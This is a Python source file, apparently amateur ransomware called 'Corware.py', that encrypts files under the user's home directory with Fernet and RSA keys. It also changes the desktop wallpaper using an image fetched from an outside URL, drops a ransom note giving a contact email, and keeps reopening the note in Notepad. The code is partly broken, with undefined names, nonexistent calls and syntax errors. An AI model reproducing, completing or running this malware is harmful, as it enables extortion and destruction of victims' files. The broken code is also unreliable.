"""
* This is Corware.py (v2) for Windows 10 only.
+--------------------------------------------+

Creators:
	* Parad0x (Python Developer)
	* Snavellet (Back/Front-end Developer)
	* DVisual (Application Form Developer)
	* Carrots & Soy Sauce (HTML & CSS Developer)

NOTES:
	* AES KEYS:
		* 00 = PRIVATE KEY
		* 01 = PUBLIC KEY
	* Corware.py has a responsibiity to automatically select which malware to implement.
	* This version is currently in a Debugging / Beta stage and should only be ran by developers / testers

Todo:
	* Generate RSA encryption, decryption + public / private keys
	* Overwrite files, duh.
	* Change users background
	* Run notepad with a note containing instructions

Comments: ( not used )
	# let's first generate an RSA encryption
	key = RSA.generate(2048)

	# define public & private keys
	private_key = key.export_key()
	with open('00.pem', 'wb') as f:
		f.write(private_key)

	public_key = key.publickey().export_key()
	with open('01.pem', 'wb') as f:
		f.write(public_key)

"""


from cryptography.fernet import Fernet # encrypt / decrypt
import os
import webbrowser
import ctypes
import urllib.request
import requests
import time
import datetime
import subprocess
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading

def key():
	# let's first generate an RSA encryption
	key = RSA.generate(2048)

	# define public & private keys
	private_key = key.export_key()
	with open('00.pem', 'wb') as f:
		f.write(private_key)

	public_key = key.publickey().export_key()
	with open('01.pem', 'wb') as f:
		f.write(public_key)

class Corware:

	# target file extension (?)
	file_extension = [
		'txt',
		# all files compatable
	]

	def __init__(self):
		# key that will be used for fernet encryption
		self.key = None
		# (En/De)crypt
		self.crypter = None
		# RSA Public KEY
		self.public_key = None

		'''
			Find Root Directory to start (En/De)cryption
			* IF you're testing me, DO NOT USE 'self.sysRoot',
			you'll encrypt your system.
		'''
		# create absolute path for files
		self.sysRoot = os.path.expanduser('~')

		""" use localroot for testing
			self.localRoot = ...
		"""
		# obtain user's public IP
		self.publicIP = requests.get('api.ipify.org').text

	# Generates a symmetric key on victim machine used to encrypt	
	def i_make_key(self):
		# generate a url safe `base64 encoded` key
		self.key = Fernet.i_make_key()
		# creates a fernet object with (en/de)cryption methods
		self.crypter = Fernet(self.key)

	# writes fernet_key.txt
	def i_can_write(self):
		with open('i_am_your_fernet_key.txt', 'wb') as f:
			f.write(self.key)

	def your_fernet_key_is_dead(self):
		with open('i_am_your_fernet_key.txt', 'rb') as fk:
			fernet_key = fk.read()
		with open('i_am_your_fernet_key.txt', 'wb') as f:
			# public RSA key
			self.public_key = RSA.import_key(open('01.pem').read())
			# public object encrypter
			public_crypter = PKCS1_OAEP.new(self.public_key)
			# encrypted fernet key
			enc_fernet_key = public_crypter.encrypt(fernet_key)
			# writes the encrypted fernet key to i_can_write()
			f.write(enc_fernet_key)
		# write encrypted fernet key to desktop
		with open(f'{self.sysRoot}Desktop/READ_ME.txt', 'wb') as fa:
			fa.write(enc_fernet_key)
		# assign self.key toe encrypted fernet key
		self.key = enc_fernet_key
		# remove fernet crypter object
		self.crypter = None
	def i_encrypt_you(self, file_path, encrypted=False):
		with open(file_path, 'rb') as f:
		# read data from fle
			data = f.read()
			if not encrypted:
				print(data)
				_data = self.crypter.encrypt(data)
				print('> Files encrypted')
				print(_data)
			else:
				_data = self.crypter.decrypt(data)
				print('> Files decrypted')
				print(_data)
		with open(file_path, 'wb') as fp:
			fp.write(_data)

	def bye_bye_system(self, encrypted=False):
		system = os.walk(self.localRoot, topdown=True)
		for root, dir, files in system:
			for file in files:
				file_path = os.path.join(root, file)
				if not file.split('.')[-1] in self.file_extension:
					continue
				if not encrypted:
					self.crypt_file(file_path)
				else:
					self.crypt_file(file_path, encrypted=True)

	@staticmethod
	def anti_virus():
		url = 'https://codepen.io/MAXHACKER/pen/BaNVZNB'
		webbrowser.open(url)

	def bye_bye_background(self):
		imageUrl = 'https://cdn.discordapp.com/attachments/689056108018401300/689363361980350524/iu.png'
		path = f'{self.sysRoot}Desktop/background.png'
		urllib.request.urlretrieve(imageUrl, path)
		SPI_SETDESKWALLPAPER = 20
		ctypes.windll.user32.SystemParameterInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

	def note(self):
		date = datetime.date.today().strftime('%d-%B-Y')
		with open('i_am_your_fernet_key.txt', 'rb') as fp:
			self.key = fp.read()
		with open('OPEN_ME.txt', 'w') as f:
			f.write(f'''
If you see this, your PC is fucked.\n~ Love parad0x
Test:
1. Email the file called read READ_ME.txt at {self.sysRoot}Desktop/READ_ME.txt to parad0xxxx@gmail.com''')
	def show_note(self):
		ransom = subprocess.Popen(['notepad.exe', 'READ_ME.txt'])
		count = 0
		while TrueL
		top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
		if top_window == 'READ_ME - Notepad':
			pass
		else:
			time.sleep(0.1)
			ransom.kill()
			time.sleep(0.1)
			ransom = subprocess.Popen(['notepad.exe', 'READ_ME.txt'])
		time.sleep(10)
		count +=1
		if count == 5:
			break

	def put_me_on_desktop(self):
		while True:
			try:
				with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP', 'r') as f:
					self.key = f.read()
					self.crypter = Fernet(self.key)
					self.bye_bye_system(encrypted=True)
					break
			except Exception as e:
				print(e)
				pass
			time.sleep(10)
			print('Checking for PUT_ME_ON_DESKTOP.txt')

def main():
	cr = Crypto()
	cr.i_make_key()
	cr.bye_bye_system()
	cr.i_can_write()
	cr.your_fernet_key_is_dead()
	cr.bye_bye_background()
	cr.anti_virus()
	cr.note()

	t1 = threading.Thread(target=rw.show_note)
	t2 = threading.Thread(target=put_me_on_desktop)

	t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing

if __name__ == '__main__':
	key()
	main():
